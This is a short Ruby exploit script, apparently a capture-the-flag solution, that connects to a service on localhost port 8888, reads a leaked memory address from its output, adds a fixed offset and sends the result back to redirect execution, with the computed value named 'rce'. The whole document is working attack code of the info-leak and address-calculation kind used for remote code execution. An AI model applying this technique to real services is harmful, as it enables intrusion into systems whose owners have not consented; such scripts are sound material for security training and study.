require_relative 'shoe'
s = Shoe.new "localhost", 8888
blah = s.read_n_seconds 0.5
rce = blah.split[4].hex + 0x000f170d
s.say "#{rce}\n"
s.tie!
